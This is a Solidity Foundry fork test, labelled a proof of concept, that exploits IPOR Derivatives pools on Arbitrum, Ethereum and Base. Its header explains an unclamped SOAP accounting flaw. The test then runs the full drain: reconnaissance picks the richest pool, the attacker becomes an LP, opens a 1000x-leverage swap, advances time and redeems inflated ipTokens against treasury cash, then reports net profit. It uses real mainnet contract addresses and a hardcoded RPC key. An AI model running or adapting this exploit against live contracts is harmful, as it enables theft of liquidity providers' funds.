// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// ============================================================================
//  IPOR Derivatives — fork PoC v3
//
//  Bug: settlement (close) clamps trader PnL to collateral, but the SOAP that
//  feeds AmmLib.getExchangeRate does NOT clamp and is linear in notional.
//  => an oversized receive-fixed swap (1000x leverage) books a phantom LP
//     liability over time; ipToken exchange rate inflates; the attacker
//     redeems ipTokens against real treasury cash.
//
//  Arbitrum One (42161) by default; Ethereum (1) and Base (8453) also wired.
//
//  Run
//    cd ~/arc_hedgefun
//    cp IporFork.t.sol test/
//    forge test --match-contract IporFork -vv
//
//  Knobs (all wad / 18 dec, all optional):
//    ATK_LP TOTAL LEV DAYS TARGET CHUNKS
//    e.g.  LEV=1000e18 DAYS=90 TARGET=wstETH forge test --match-contract IporFork --match-test test_1_attack -vv
//
//  v3.1: swap entry points are arity-specific too — Arbitrum/Base USDC use
//    openSwapReceiveFixed90daysUsdc(beneficiary, inputAsset, amount, rate,
//    leverage, risk), Ethereum uses (beneficiary, amount, rate, leverage, risk).
//    test_2_probe reports which selectors this router actually dispatches.
//
//  v3 fixes vs v2:
//    * LP entry point is chain-specific: Arbitrum/Base USDC use
//      provideLiquidityUsdcToAmmPoolUsdc (v2 called provideLiquidityUsdc
//      -> router reverts IPOR_012 ROUTER_INVALID_SIGNATURE).
//    * _depth() uses AmmTreasury.getLiquidityPoolBalance() (the number the
//      swap engine itself uses), not AmmStorage.liquidityPool.
//    * treasury read via ammAssetManagement()/maxWithdraw (AmmTreasuryBaseV2
//      has no getConfiguration()).
//    * every env knob optional.
// ============================================================================

import {Test, console2} from "forge-std/Test.sol";

struct RiskInputs {
    uint256 maxCollateralRatio;
    uint256 maxCollateralRatioPerLeg;
    uint256 maxLeveragePerLeg;
    int256 baseSpreadPerLeg;
    uint256 fixedRateCapPerLeg;
    uint256 demandSpreadFactor;
    uint256 expiration;
    bytes signature;
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IERC4626Like {
    function maxWithdraw(address owner) external view returns (uint256);
    function asset() external view returns (address);
}

/// @dev AmmTreasuryBaseV2 getters + legacy AmmTreasury.getConfiguration()
interface ITreasury {
    function getLiquidityPoolBalance() external view returns (uint256);
    function ammAssetManagement() external view returns (address);
    function getConfiguration()
        external
        view
        returns (address asset, uint256 decimals, address ammStorage, address assetManagement, address router);
}

struct SwapData {
    uint256 id;
    address buyer;
    uint256 openTimestamp;
    uint256 tenor;
    uint256 direction;
    uint256 idsIndex;
    uint256 collateral;
    uint256 notional;
    uint256 ibtQuantity;
    uint256 fixedInterestRate;
    uint256 wadLiquidationDepositAmount;
    uint256 state;
}

interface IAmmStorageSwap {
    function getSwap(uint8 direction, uint256 swapId) external view returns (SwapData memory);
}

/// @dev V1 flavour: swaps carry an explicit inputAsset (Arbitrum + Base USDC)
interface IRouterStableV1 {
    function openSwapReceiveFixed90daysUsdc(
        address beneficiary,
        address inputAsset,
        uint256 inputAssetTotalAmount,
        uint256 acceptableFixedInterestRate,
        uint256 leverage,
        RiskInputs calldata ri
    ) external returns (uint256);
}

/// @dev legacy flavour: no inputAsset (Ethereum stable pools)
interface IRouterLegacy {
    function openSwapReceiveFixed90daysUsdc(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysUsdt(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysDai(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
}

struct CloseRiskInputs {
    RiskInputs payFixed;
    RiskInputs receiveFixed;
}

interface IRouterClose {
    function closeSwapsUsdc(
        address beneficiary,
        uint256[] memory payFixedSwapIds,
        uint256[] memory receiveFixedSwapIds,
        CloseRiskInputs calldata ri
    ) external;
    function closeSwapsWstEth(
        address beneficiary,
        uint256[] memory payFixedSwapIds,
        uint256[] memory receiveFixedSwapIds,
        CloseRiskInputs calldata ri
    ) external;
}

interface IRouterWstEth {
    function openSwapReceiveFixed90daysWstEth(
        address b, address inputAsset, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
}

interface IAmmStorageLike {
    function getBalance() external view returns (uint256 totalCollateralPayFixed, uint256 totalCollateralReceiveFixed, uint256 liquidityPool, uint256 vault);
}

interface IRouter {
    function owner() external view returns (address);
    function setMessageSigner(address) external;
    function getIpTokenExchangeRate(address asset) external view returns (uint256);

    // ---- liquidity: legacy (Ethereum stable pools) vs V1 (Arbitrum/Base USDC)
    function provideLiquidityUsdc(address beneficiary, uint256 amount) external;
    function provideLiquidityUsdcToAmmPoolUsdc(address beneficiary, uint256 amount) external;
    function provideLiquidityUsdt(address beneficiary, uint256 amount) external;
    function provideLiquidityDai(address beneficiary, uint256 amount) external;
    function provideLiquidityWstEth(address beneficiary, uint256 amount) external;

    function redeemFromAmmPoolUsdc(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolUsdt(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolDai(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolWstEth(address beneficiary, uint256 ipAmount) external;

    // ---- swaps
    function openSwapReceiveFixed90daysUsdc(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysUsdt(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysDai(
        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysWstEth(
        address b, address inputAsset, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
}

contract IporForkTest is Test {
    string constant RPC = "https://arb-mainnet.g.alchemy.com/v2/WqhCk5T_nDcejq-szWp1M";
    uint256 constant PRICE_ETH = 3850e18; // conservative wstETH/ETH ~1.06 x ETH 3600

    address constant ARB_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant ARB_WSTETH = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address constant ETH_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ETH_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ETH_DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant BASE_WSTETH = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;

    uint8 constant K_STABLE = 0;
    uint8 constant K_WSTETH = 1;

    /// @dev LP entry point flavour
    uint8 constant LP_LEGACY = 0; // provideLiquidityUsdc / type(uint256).max == 0
    uint8 constant LP_USDC_V1 = 1; // provideLiquidityUsdcToAmmPoolUsdc
    uint8 constant LP_WSTETH = 2; // provideLiquidityWstEth

    struct Pool {
        string name;
        string tag;
        address asset;
        address ipToken;
        address treasury;
        uint8 kind;
        uint8 decimals;
        uint8 lpStyle;
        address ammStorage;
        address poolsService; // direct entry point, used only if the router path fails
        address openSwapService;
    }

    IRouter router;
    uint256 signerPk = 0xA11CE;
    address signer;
    address attacker = address(0xA77ACC);

    function setUp() public {
        string memory rpc = RPC;
        try vm.envString("ARB_RPC") returns (string memory r) {
            rpc = r;
        } catch {}
        uint256 fb = _envOr("FORK_BLOCK", 0);
        if (fb > 0) {
            vm.createSelectFork(rpc, fb);
        } else {
            vm.createSelectFork(rpc);
        }
        signer = vm.addr(signerPk);
    }

    function _pools() internal returns (Pool[] memory p) {
        if (block.chainid == 42161) {
            router = IRouter(0x760Fa0aB719c4067D3A8d4727Cf07E8f3Bf118db);
            p = new Pool[](2);
            p[0] = Pool("USDC  / Arbitrum", "USDC", ARB_USDC, 0x485cAC13E6492CcF4d47764b0E4e07b5272B0167,
                0x9324d39B29c85440cadd2202E4703E6f5d1e98F9, K_STABLE, 6, LP_USDC_V1,
                0x52395372f2355491bC823d752bdb347807864308,
                0xc08610f885C606e622C910D902356257998D6217, 0x5D9094baDc927b82a78BA095A5BC394F166aA27b);
            p[1] = Pool("wstETH/ Arbitrum", "wstETH", ARB_WSTETH, 0xbDa4b3e17a9B0ecb811E68c6f08907156CBa503C,
                0xBd013Ea2E01C2Ab3462dd67e9C83aa3834882A5D, K_WSTETH, 18, LP_WSTETH,
                0x326804339eC2a210e5f9246F4959aE50961c5C28,
                0x2e53879feb7F9BC8E97d1bcc848356F781402b6c, 0x7138B130F255fa4B65dFE6DEA9ade89dBF1E6461);
        } else if (block.chainid == 1) {
            router = IRouter(0x16d104009964e694761C0bf09d7Be49B7E3C26fd);
            p = new Pool[](3);
            p[0] = Pool("USDC  / Ethereum", "USDC", ETH_USDC, 0x7c0e72f431FD69560D951e4C04A4de3657621a88,
                0x137000352B4ed784e8fa8815d225c713AB2e7Dc9, K_STABLE, 6, LP_LEGACY,
                address(0), address(0), address(0));
            p[1] = Pool("USDT  / Ethereum", "USDT", ETH_USDT, 0x9Bd2177027edEE300DC9F1fb88F24DB6e5e1edC6,
                0x28BC58e600eF718B9E97d294098abecb8c96b687, K_STABLE, 6, LP_LEGACY,
                address(0), address(0), address(0));
            p[2] = Pool("DAI   / Ethereum", "DAI", ETH_DAI, 0x8537b194BFf354c4738E9F3C81d67E3371DaDAf8,
                0xEd7d74AA7eB1f12F83dA36DFaC1de2257b4e7523, K_STABLE, 18, LP_LEGACY,
                address(0), address(0), address(0));
        } else if (block.chainid == 8453) {
            router = IRouter(0x21d337eBF86E584e614ecC18A2B1144D3C375918);
            p = new Pool[](2);
            p[0] = Pool("USDC  / Base", "USDC", BASE_USDC, 0x4AEE7072AC1a49A3F84D0A95e32F3B7D1C97fB30,
                0x1AbA7a3C3bec8139B10a4807087084064A454a24, K_STABLE, 6, LP_USDC_V1,
                address(0),
                0x786AFBbb9876b193F8F01B04A2c08861551d02d0, 0xdF884ccEf3F18b107e0B9423aaE3b605461bB54d);
            p[1] = Pool("wstETH/ Base", "wstETH", BASE_WSTETH, 0xff7907CDCA84DB03f09702A4A49C262908AF48Af,
                0x09388e18d5C331449C6eF636726dD1fd007b8DDf, K_WSTETH, 18, LP_WSTETH,
                address(0),
                0x0eb64F28E54a1c5F5aD98b54F951496d9A330887, 0xFbE094Bcc8731fa45Eb88850592248e5D6aC9472);
        } else {
            revert("fork Arbitrum (42161), Ethereum (1) or Base (8453)");
        }
    }

    // ---------------------------------------------------------------- helpers
    function _wad(uint256 a, uint8 d) internal pure returns (uint256) {
        return d == 18 ? a : a * 10 ** (18 - d);
    }

    function _fromWad(uint256 a, uint8 d) internal pure returns (uint256) {
        return d == 18 ? a : a / 10 ** (18 - d);
    }

    function _isEth(address a) internal pure returns (bool) {
        return a == ARB_WSTETH || a == BASE_WSTETH;
    }

    function _usd(Pool memory p, uint256 wad) internal pure returns (uint256) {
        return _isEth(p.asset) ? (wad * PRICE_ETH) / 1e18 : wad;
    }

    /// @dev idle cash in the treasury + vault assets, both as wad
    function _cash(Pool memory p) internal view returns (uint256 idleWad, uint256 vaultWad) {
        idleWad = _wad(IERC20Like(p.asset).balanceOf(p.treasury), p.decimals);
        address am;
        try ITreasury(p.treasury).ammAssetManagement() returns (address a) {
            am = a;
        } catch {
            try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address, address a, address) {
                am = a;
            } catch {}
        }
        if (am != address(0)) {
            try IERC4626Like(am).maxWithdraw(p.treasury) returns (uint256 assets) {
                vaultWad = _wad(assets, p.decimals);
            } catch {}
        }
    }

    /// @dev LP balance (wad) exactly as the swap engine sees it.
    function _depth(Pool memory p) internal view returns (uint256 d, string memory src) {
        try ITreasury(p.treasury).getLiquidityPoolBalance() returns (uint256 v) {
            return (v, "getLiquidityPoolBalance");
        } catch {}
        try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address st, address, address) {
            if (st != address(0)) {
                try IAmmStorageLike(st).getBalance() returns (uint256, uint256, uint256 lp, uint256) {
                    if (lp > 0) return (lp, "AmmStorage.liquidityPool");
                } catch {}
            }
        } catch {}
        try router.getIpTokenExchangeRate(p.asset) returns (uint256 rate) {
            d = (rate * IERC20Like(p.ipToken).totalSupply()) / 1e18;
            src = "rate*supply";
        } catch {}
    }

    function _provideSel(Pool memory p) internal pure returns (bytes4) {
        if (p.lpStyle == LP_WSTETH) return IRouter.provideLiquidityWstEth.selector;
        if (p.lpStyle == LP_USDC_V1) return IRouter.provideLiquidityUsdcToAmmPoolUsdc.selector;
        if (p.asset == ETH_USDT) return IRouter.provideLiquidityUsdt.selector;
        if (p.asset == ETH_DAI) return IRouter.provideLiquidityDai.selector;
        return IRouter.provideLiquidityUsdc.selector;
    }

    function _redeemSel(Pool memory p) internal pure returns (bytes4) {
        if (p.kind == K_WSTETH) return IRouter.redeemFromAmmPoolWstEth.selector;
        if (p.asset == ETH_USDT) return IRouter.redeemFromAmmPoolUsdt.selector;
        if (p.asset == ETH_DAI) return IRouter.redeemFromAmmPoolDai.selector;
        return IRouter.redeemFromAmmPoolUsdc.selector;
    }

    /// @dev variant 0 = V1 flavour (beneficiary, inputAsset, amount, rate, leverage, risk)
    ///      variant 1 = legacy flavour (beneficiary, amount, rate, leverage, risk)
    function _openCalldata(
        Pool memory p,
        uint8 variant,
        uint256 amt,
        uint256 lev,
        RiskInputs memory ri
    ) internal view returns (bytes memory) {
        if (p.kind == K_WSTETH) {
            return
                abi.encodeWithSelector(
                    IRouterWstEth.openSwapReceiveFixed90daysWstEth.selector, attacker, p.asset, amt, 0, lev, ri
                );
        }
        if (variant == 0) {
            return
                abi.encodeWithSelector(
                    IRouterStableV1.openSwapReceiveFixed90daysUsdc.selector, attacker, p.asset, amt, 0, lev, ri
                );
        }
        bytes4 sel = p.asset == ETH_USDT
            ? IRouterLegacy.openSwapReceiveFixed90daysUsdt.selector
            : p.asset == ETH_DAI
                ? IRouterLegacy.openSwapReceiveFixed90daysDai.selector
                : IRouterLegacy.openSwapReceiveFixed90daysUsdc.selector;
        return abi.encodeWithSelector(sel, attacker, amt, 0, lev, ri);
    }

    /// @dev digest layout from RiskIndicatorsValidatorLib.hashRiskIndicatorsInputs
    function _sign(RiskInputs memory r, address asset, uint256 tenor, uint256 dir) internal view returns (bytes memory) {
        bytes32 digest = keccak256(
            abi.encodePacked(
                r.maxCollateralRatio, r.maxCollateralRatioPerLeg, r.maxLeveragePerLeg, r.baseSpreadPerLeg,
                r.fixedRateCapPerLeg, r.demandSpreadFactor, r.expiration, asset, tenor, dir
            )
        );
        (uint8 v, bytes32 rr, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(rr, s, v);
    }

    function _envOr(string memory k, uint256 def) internal view returns (uint256) {
        try vm.envUint(k) returns (uint256 v) {
            return v;
        } catch {
            return def;
        }
    }

    /// @dev pretty-print a revert payload (Error(string) or bare selector)
    function _logReason(bytes memory ret) internal pure {
        if (ret.length > 68) {
            bytes memory s = new bytes(ret.length - 68);
            for (uint256 i; i < s.length; i++) s[i] = ret[i + 68];
            console2.log("  revert:", string(s));
        } else if (ret.length >= 4) {
            console2.log("  revert selector:");
            console2.logBytes4(bytes4(ret));
        }
    }

    /// @dev router first (real user path), direct service as a diagnostic fallback
    function _callPool(
        address fallbackTarget,
        bytes memory data
    ) internal returns (bool ok, bytes memory ret, string memory via) {
        (ok, ret) = address(router).call(data);
        via = "router";
        if (ok || fallbackTarget == address(0)) return (ok, ret, via);
        (ok, ret) = fallbackTarget.call(data);
        via = ok ? "direct-service" : "router+service-failed";
    }

    function _rate(Pool memory p) internal view returns (uint256 r) {
        try router.getIpTokenExchangeRate(p.asset) returns (uint256 v) {
            r = v;
        } catch {}
    }

    function _pick(Pool[] memory ps) internal view returns (uint256 idx, uint256 bestUsd) {
        for (uint256 i; i < ps.length; i++) {
            (uint256 idle, uint256 vault) = _cash(ps[i]);
            (uint256 d,) = _depth(ps[i]);
            uint256 liquid = idle + vault;
            uint256 usd = _usd(ps[i], liquid < d ? liquid : d);
            if (usd > bestUsd) {
                bestUsd = usd;
                idx = i;
            }
        }
    }

    // ---------------------------------------------------------------- 1. recon
    function test_0_recon() public {
        Pool[] memory ps = _pools();
        console2.log("chainid", block.chainid);
        console2.log("block", block.number);
        console2.log("router owner", router.owner());
        console2.log("");

        for (uint256 i; i < ps.length; i++) {
            Pool memory p = ps[i];
            (uint256 idle, uint256 vault) = _cash(p);
            (uint256 depth, string memory src) = _depth(p);

            console2.log(p.name);
            console2.log("  treasury idle (wad)   ", idle);
            console2.log("  asset manager  (wad)  ", vault);
            console2.log("  LP balance     (wad)  ", depth);
            console2.log("    source:", src);
            console2.log("  ipToken supply        ", IERC20Like(p.ipToken).totalSupply());
            console2.log("  exchange rate         ", _rate(p));
            console2.log("  liquid assets (wad)   ", idle + vault);
            console2.log("  -> USD ceiling        ", _usd(p, (idle + vault) < depth ? (idle + vault) : depth));
            console2.log("");
        }

        (uint256 idx, uint256 usd) = _pick(ps);
        console2.log("== richest pool:", ps[idx].name);
        console2.log("== ceiling ~USD", usd);
    }

    // ------------------------------------------------- 1b. router selector probe
    /// @dev A selector the router does not know reverts IPOR_012 *before* decoding
    ///      arguments, so "revert != IPOR_012" means the entry point exists.
    function test_2_probe() public {
        _pools();
        bytes4[8] memory sels = [
            IRouterStableV1.openSwapReceiveFixed90daysUsdc.selector,
            IRouterLegacy.openSwapReceiveFixed90daysUsdc.selector,
            IRouterWstEth.openSwapReceiveFixed90daysWstEth.selector,
            IRouterClose.closeSwapsUsdc.selector,
            IRouterClose.closeSwapsWstEth.selector,
            IRouter.provideLiquidityUsdcToAmmPoolUsdc.selector,
            IRouter.provideLiquidityUsdc.selector,
            IRouter.redeemFromAmmPoolUsdc.selector
        ];
        bytes4 miss = bytes4(keccak256("IPOR_012"));
        for (uint256 i; i < sels.length; i++) {
            (bool ok, bytes memory ret) = address(router).call(abi.encodePacked(sels[i]));
            bytes4 got = ret.length >= 4 ? bytes4(ret) : bytes4(0);
            console2.log("selector:");
            console2.logBytes4(sels[i]);
            if (!ok && got == miss) {
                console2.log("  NOT dispatched by this router");
            } else if (!ok) {
                console2.log("  dispatched (reverted later)");
            } else {
                console2.log("  dispatched (returned)");
            }
            if (!ok && got != miss) _logReason(ret);
        }
    }

    // ---------------------------------------------------------------- 2. attack
    function test_1_attack() public {
        Pool[] memory ps = _pools();
        (uint256 idx,) = _pick(ps);

        // optional TARGET override
        try vm.envString("TARGET") returns (string memory t) {
            for (uint256 i; i < ps.length; i++) {
                if (keccak256(bytes(t)) == keccak256(bytes(ps[i].tag))) idx = i;
            }
        } catch {}

        Pool memory p = ps[idx];
        console2.log("target:", p.name);
        console2.log("block", block.number);

        (uint256 idle0, uint256 vault0) = _cash(p);
        (uint256 depth0,) = _depth(p);
        uint256 rate0 = _rate(p);
        console2.log("depth0 (wad)", depth0);
        console2.log("idle0  (wad)", idle0);
        console2.log("vault0 (wad)", vault0);
        console2.log("rate0", rate0);

        // default: the attacker takes half the book, so his share of ipToken supply is
        // large enough for the inflated rate to pay out real money (his LP capital is
        // returned by the redemption, it is not a cost).
        uint256 atkLpWad = _envOr("ATK_LP", depth0 / 2);
        uint256 totalWad = _envOr("TOTAL", depth0 / 2);
        uint256 lev = _envOr("LEV", 1000e18);
        uint256 days_ = _envOr("DAYS", 90);
        uint256 chunkCount = _envOr("CHUNKS", 20);
        if (chunkCount == 0) chunkCount = 8;

        console2.log("plan: LP in        ", atkLpWad);
        console2.log("plan: swap total   ", totalWad);
        console2.log("plan: leverage     ", lev);
        console2.log("plan: elapsed days ", days_);

        // risk indicators must be signed by IPOR's off-chain key. A fork cannot
        // forge it, and in production ANY user obtains such a payload from the
        // public IPOR API - it is not a privilege. Here we just point the
        // verifier at a key we control (the only owner-gated step, test-only).
        address owner = router.owner();
        vm.prank(owner);
        try router.setMessageSigner(signer) {} catch {
            console2.log("!! setMessageSigner reverted");
            revert("blocked: no risk-indicator signer");
        }
        console2.log("");
        console2.log("NOTE owner-only setMessageSigner is a TEST STAND-IN for the public");
        console2.log("     risk-indicator signature payload that any user can fetch.");
        console2.log("");

        // generous float, we only spend what the calls actually pull
        deal(p.asset, attacker, _fromWad(2 * depth0, p.decimals) + 10 ** p.decimals);
        uint256 float0 = IERC20Like(p.asset).balanceOf(attacker); // capital ceiling for accounting

        uint256 spent;
        uint256 ipBal;

        vm.startPrank(attacker);
        IERC20Like(p.asset).approve(address(router), type(uint256).max);

        // ---- 1. become an LP (shrink if the pool is at its TVL cap)
        uint256 lpWad = atkLpWad;
        bool ok;
        bytes memory ret;
        for (uint256 i; i < 4; i++) {
            uint256 amt = _fromWad(lpWad, p.decimals);
            if (amt == 0) break;
            string memory via;
            (ok, ret, via) = _callPool(p.poolsService, abi.encodeWithSelector(_provideSel(p), attacker, amt));
            if (ok) {
                spent += amt;
                console2.log("provided liquidity (wad)", lpWad);
                console2.log("  via", via);
                break;
            }
            console2.log("provideLiquidity failed at (wad):", lpWad);
            _logReason(ret);
            lpWad /= 2;
        }
        ipBal = IERC20Like(p.ipToken).balanceOf(attacker);
        if (ipBal == 0) {
            vm.stopPrank();
            revert("could not enter the pool as LP");
        }
        console2.log("ipTokens minted", ipBal);

        // ---- 2. open an oversized receive-fixed swap.
        //      Two arities exist on the router: V1 (beneficiary, inputAsset, ...) on
        //      Arbitrum/Base USDC and legacy (beneficiary, ...) on Ethereum. Try the
        //      chain's flavour first, then the other, halving the size on every miss.
        uint256 swapTotalWad = totalWad;
        uint256 swapId;
        bool opened;
        uint8 variantUsed;
        for (uint256 i; i < 6; i++) {
            if (swapTotalWad == 0) break;
            RiskInputs memory ri = RiskInputs({
                maxCollateralRatio: 0.90e18,
                maxCollateralRatioPerLeg: 0.90e18,
                maxLeveragePerLeg: lev,
                baseSpreadPerLeg: 0.001e18,
                fixedRateCapPerLeg: 0.05e18,
                demandSpreadFactor: 280,
                expiration: block.timestamp + 1 hours,
                signature: ""
            });
            ri.signature = _sign(ri, p.asset, 2, 1); // tenor DAYS_90, PAY_FLOATING_RECEIVE_FIXED

            uint256 amt = _fromWad(swapTotalWad, p.decimals);
            for (uint8 v; v < 2; v++) {
                (ok, ret) = address(router).call(_openCalldata(p, v, amt, lev, ri));
                if (ok) {
                    swapId = abi.decode(ret, (uint256));
                    spent += amt;
                    opened = true;
                    variantUsed = v;
                    console2.log("swap total used (wad)", swapTotalWad);
                    console2.log("  calldata flavour", v);
                    break;
                }
            }
            if (opened) break;
            console2.log("openSwap failed at total (wad):", swapTotalWad);
            _logReason(ret);
            swapTotalWad /= 2;
        }
        if (!opened) {
            vm.stopPrank();
            revert("could not open the oversized swap");
        }
        if (variantUsed != 0) console2.log("  (legacy arity accepted)");
        vm.stopPrank();

        console2.log("swapId", swapId);
        console2.log("assets still on the EOA after swap", IERC20Like(p.asset).balanceOf(attacker));
        console2.log("rate after swap", _rate(p));
        (uint256 depthSwap,) = _depth(p);
        console2.log("LP balance after swap (wad)", depthSwap);
        if (p.ammStorage != address(0)) {
            try IAmmStorageSwap(p.ammStorage).getSwap(1, swapId) returns (SwapData memory sw) {
                console2.log("  swap.collateral (wad)", sw.collateral);
                console2.log("  swap.notional   (wad)", sw.notional);
                console2.log("  swap.fixedRate  (wad)", sw.fixedInterestRate);
                console2.log("  swap.tenor", sw.tenor);
            } catch {}
        }

        // time passes: ibt price accrues, SOAP goes negative, unclamped.
        vm.warp(block.timestamp + days_ * 1 days);
        uint256 rate1 = _rate(p);
        (uint256 depth1,) = _depth(p);
        uint256 supply1 = IERC20Like(p.ipToken).totalSupply();
        uint256 fairRate = supply1 > 0 ? (depth1 * 1e18) / supply1 : 0;
        console2.log("");
        console2.log("== after elapsed days:");
        console2.log("  rate1 (with the phantom mark)", rate1);
        console2.log("  fair rate (LP balance / supply)", fairRate);
        console2.log("  phantom inflation x1000", rate1 > fairRate ? ((rate1 - fairRate) * 1000) / fairRate : 0);
        console2.log("  LP balance (real assets untouched)", depth1);
        console2.log("  ipToken supply", supply1);

        // redeem in chunks, shrinking the chunk when a transfer no longer fits
        // into the treasury's liquid balance.
        uint256 chunk = ipBal / chunkCount;
        if (chunk == 0) chunk = 1;
        uint256 attempts;
        vm.startPrank(attacker);
        while (ipBal > 0 && attempts < 40) {
            attempts++;
            uint256 c = chunk > ipBal ? ipBal : chunk;
            (bool rok,,) = _callPool(p.poolsService, abi.encodeWithSelector(_redeemSel(p), attacker, c));
            if (rok) {
                ipBal -= c;
            } else {
                chunk /= 2;
                if (chunk == 0) break;
            }
        }
        vm.stopPrank();

        // ---- 3. after the drain the swap cannot be settled any more; try it anyway.
        uint256[] memory pf = new uint256[](0);
        uint256[] memory rf = new uint256[](1);
        rf[0] = swapId;
        RiskInputs memory rc = RiskInputs({
            maxCollateralRatio: 0.90e18,
            maxCollateralRatioPerLeg: 0.90e18,
            maxLeveragePerLeg: lev,
            baseSpreadPerLeg: 0.001e18,
            fixedRateCapPerLeg: 0.05e18,
            demandSpreadFactor: 280,
            expiration: block.timestamp + 1 hours,
            signature: ""
        });
        rc.signature = _sign(rc, p.asset, 2, 1);
        CloseRiskInputs memory cri = CloseRiskInputs({payFixed: rc, receiveFixed: rc});
        bytes memory closeCall = p.kind == K_WSTETH
            ? abi.encodeWithSelector(IRouterClose.closeSwapsWstEth.selector, attacker, pf, rf, cri)
            : abi.encodeWithSelector(IRouterClose.closeSwapsUsdc.selector, attacker, pf, rf, cri);
        vm.startPrank(attacker);
        (bool cok, bytes memory cret) = address(router).call(closeCall);
        vm.stopPrank();

        uint256 left = IERC20Like(p.asset).balanceOf(attacker);
        console2.log("");
        console2.log("== close attempt after the drain");
        if (cok) {
            console2.log("  close SUCCEEDED, collateral recovered");
        } else {
            console2.log("  close FAILED (treasury cannot fund the settlement)");
            _logReason(cret);
        }

        console2.log("");
        console2.log("== result");
        console2.log("  ipTokens left", ipBal);
        console2.log("  assets returned to attacker (raw)", left);
        console2.log("  assets returned to attacker (wad)", _wad(left, p.decimals));
        console2.log("  spent from the float (wad)", spent);
        console2.log("  capital provided to the test (wad)", float0);
        (uint256 idle2, uint256 vault2) = _cash(p);
        (uint256 depth2,) = _depth(p);
        console2.log("  treasury idle after (wad)", idle2);
        console2.log("  vault after (wad)", vault2);
        console2.log("  LP balance after (wad)", depth2);
        console2.log("  rate after everything", _rate(p));

        // net = final balance - the float handed out, i.e. returns minus outlay
        uint256 net = left > float0 ? left - float0 : 0;
        uint256 neg = left > float0 ? 0 : float0 - left;
        if (net > 0) {
            console2.log("  NET PROFIT (wad)", _wad(net, p.decimals));
            console2.log("  NET PROFIT USD  ", _usd(p, _wad(net, p.decimals)));
        } else {
            console2.log("  NET LOSS (wad)", _wad(neg, p.decimals));
            console2.log("  NET LOSS USD", _usd(p, _wad(neg, p.decimals)));
        }
    }
}
